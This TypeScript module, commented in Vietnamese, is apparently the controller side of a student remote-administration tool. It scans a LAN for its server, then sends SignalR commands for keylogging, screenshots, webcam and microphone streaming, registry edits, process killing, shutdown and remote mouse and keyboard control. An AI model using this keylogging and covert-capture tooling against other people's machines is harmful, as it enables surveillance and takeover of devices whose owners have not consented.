import { HubConnection, HubConnectionBuilder, LogLevel } from '@microsoft/signalr';

// Khai báo biến connection để dùng chung
let connection: HubConnection;

const checkIP = async (ip: string): Promise<string | null> => {
    try {
        const controller = new AbortController();
        // Tăng timeout lên 1s (hoặc 1.5s nếu mạng wifi yếu)
        const timeoutId = setTimeout(() => controller.abort(), 1000);

        const response = await fetch(`http://${ip}:5000/api/discovery`, {
            signal: controller.signal,
            method: 'GET',
            mode: 'cors'
        });

        clearTimeout(timeoutId);

        if (response.ok) {
            const data = await response.json();
            if (data.message === "REMOTE_SERVER_HERE") {
                return ip; // Trả về IP ngay khi tìm thấy
            }
        }
    } catch (e) {
        // Lỗi kết nối hoặc timeout -> Bỏ qua
        return null;
    }
    return null;
};

// 2. Kỹ thuật Batching (Chia lô để quét)
export const scanForServer = async (baseIP: string = "192.168.1"): Promise<string | null> => {
    console.log(`📡 Đang quét mạng LAN dải ${baseIP}.x (Thuật toán 2 đầu)...`);

    // 1. TẠO DANH SÁCH IP THEO THỨ TỰ ƯU TIÊN (Đầu -> Cuối -> Giữa)
    // Kết quả sẽ là: [1, 254, 2, 253, 3, 252, ...]
    const orderedIPs: string[] = [];
    let left = 1;
    let right = 254;

    while (left <= right) {
        if (left === right) {
            orderedIPs.push(`${baseIP}.${left}`);
        } else {
            orderedIPs.push(`${baseIP}.${left}`);
            orderedIPs.push(`${baseIP}.${right}`);
        }
        left++;
        right--;
    }

    // 2. TĂNG KÍCH THƯỚC BATCH ĐỂ QUÉT NHANH HƠN
    // Mạng LAN thường chịu được 50-100 request cùng lúc.
    // Nếu để 20 thì phải chờ 13 lượt. Để 50 chỉ cần chờ 5 lượt.
    const BATCH_SIZE = 50;

    // 3. CHẠY LOOP THEO MẢNG ĐÃ SẮP XẾP
    for (let i = 0; i < orderedIPs.length; i += BATCH_SIZE) {
        // Cắt ra 1 lô 50 IP từ danh sách đã sắp xếp
        const batchIPs = orderedIPs.slice(i, i + BATCH_SIZE);

        // Tạo promise cho lô này
        const batchPromises = batchIPs.map(ip => checkIP(ip));

        console.log(`Checking batch: ${batchIPs[0]} ... ${batchIPs[batchIPs.length - 1]}`);

        // Chờ cả lô chạy xong (Song song)
        const results = await Promise.all(batchPromises);

        // Tìm xem có thằng nào phản hồi không
        const foundIP = results.find(ip => ip !== null);

        if (foundIP) {
            console.log(`✅ Đã tìm thấy Server tại: ${foundIP}`);
            return foundIP; // Tìm thấy là return luôn, cắt vòng lặp
        }
    }

    console.log("❌ Không tìm thấy Server nào.");
    return null;
};

// Sửa lại hàm initSocket để nhận IP động
export const initSocket = (serverIP: string): HubConnection => {
    const SERVER_URL = `http://${serverIP}:5000/systemHub`;

    console.log(`[SignalR] Đang kết nối tới: ${SERVER_URL}`);

    connection = new HubConnectionBuilder()
        .withUrl(SERVER_URL)
        .withAutomaticReconnect()
        .configureLogging(LogLevel.Information)
        .build();

    //connection.start()
    //    .then(() => {
    //        console.log('[SignalR] Kết nối thành công tới Server C#!');
    //    })
    //    .catch((err) => {
    //        console.error('[SignalR] Lỗi kết nối:', err);
    //        alert("KHÔNG KẾT NỐI ĐƯỢC!\nLỗi chi tiết: " + err.toString());
    //    });
    return connection;
};

// Hàm lấy connection hiện tại (để các component khác dùng)
export const getSocket = () => connection;

/**
 * Hàm gửi lệnh sang C#
 * @param action Tên hành động (ví dụ: "start_keylog")
 * @param payload Dữ liệu kèm theo (ví dụ: ID process cần kill)
 */
export const sendCommand = async (action: string, payload?: any) => {
    if (!connection) throw new Error("Chưa kết nối tới Server!");

    try {
        console.log(`[Gửi lệnh] ${action}`, payload);

        // Ánh xạ từ tên lệnh của Client sang tên hàm trong SystemHub.cs của Server
        switch (action) {
            // --- NHÓM LỆNH CŨ ---
            case 'start_keylog':
                await connection.invoke("StartKeylog");
                break;
            case 'stop_keylog':
                await connection.invoke("StopKeylog");
                break;
            case 'take_screenshot':
                await connection.invoke("TakeScreenshot");
                break;
            case 'shutdown':
                await connection.invoke("ShutdownServer");
                break;
            case 'restart':
                await connection.invoke("RestartServer");
                break;
            case 'list_processes':
                await connection.invoke("GetProcesses");
                break;
            case 'kill_process':
                await connection.invoke("KillProcess", Number(payload));
                break;
            case 'start_app':
                await connection.invoke("StartApp", String(payload));
                break;
            case 'registry_command':
                if (payload) {
                    await connection.invoke("SendRegistryCommand",
                        payload.action, payload.link, payload.valueName, payload.value, payload.typeValue
                    );
                }
                break;
            case 'get_webcams':
                await connection.invoke("GetWebcams");
                break;
            case 'start_webcam':
                await connection.invoke("StartWebcam", Number(payload));
                break;
            case 'stop_webcam':
                await connection.invoke("StopWebcam");
                break;

            // --- [QUAN TRỌNG] NHÓM LỆNH ULTRAVIEWER MỚI ---
            // Đây là phần bạn bị thiếu, tôi đã thêm vào:
            case 'start_screenshare':
                await connection.invoke("StartScreenShare");
                break;
            case 'stop_screenshare':
                await connection.invoke("StopScreenShare");
                break;
            case 'remote_mousemove':
                // payload = { x: 100, y: 200 }
                await connection.invoke("RemoteMouseMove", payload.x, payload.y);
                break;
            case 'remote_click':
                // payload = "left" hoặc "right"
                await connection.invoke("RemoteMouseClick", payload);
                break;
            case 'remote_keypress':
                // payload = mã phím (int)
                await connection.invoke("RemoteKeyPress", payload);
                break;
            case 'remote_keydown':
                await connection.invoke("RemoteKeyDown", payload);
                break;
            case 'remote_keyup':
                await connection.invoke("RemoteKeyUp", payload);
                break;
            // [MỚI] Reset phím
            case 'reset_keys':
                await connection.invoke("ResetKeys");
                break;
            case 'start_webrtc':
                // SỬA LẠI DÒNG NÀY
                // payload lúc này là { camIndex: 0, micIndex: 0 }
                // Nếu payload bị null/undefined thì truyền 0, 0 cho chắc
                const camIdx = payload?.camIndex ?? 0;
                const micIdx = payload?.micIndex ?? 0;

                // Invoke phải truyền các tham số cách nhau bởi dấu phẩy
                await connection.invoke("RequestWebRTCStream", camIdx, micIdx);
                break;
            case 'send_webrtc_answer':
                // payload = chuỗi SDP
                await connection.invoke("SendWebRTCAnswer", payload);
                break;
            case 'send_ice_candidate':
                // payload = chuỗi JSON candidate
                await connection.invoke("SendIceCandidate", payload);
                break;

            case 'remote_scroll':
                // Gọi đúng tên hàm mà ta đã map bên Server bằng [HubMethodName("remote_scroll")]
                // Dùng 'connection' thay vì 'socket', dùng 'payload' thay vì 'data'
                await connection.invoke('remote_scroll', payload); 
                break;
            // --- THÊM 2 CÁI NÀY ĐỂ KÉO THẢ (DRAG & DROP) ---
            case 'remote_mousedown':
                // payload = "left" hoặc "right"
                await connection.invoke("RemoteMouseDown", payload);
                break;
            case 'remote_mouseup':
                // payload = "left" hoặc "right"
                await connection.invoke("RemoteMouseUp", payload);
                break;
            // -----------------------------------------------
            default:
                // Nếu lệnh không khớp cái nào ở trên thì sẽ chạy vào đây và báo lỗi vàng
                console.warn("Lệnh không được hỗ trợ:", action);
        }
    } catch (err) {
        console.error(`Lỗi khi gửi lệnh ${action}:`, err);
        throw err;
    }
};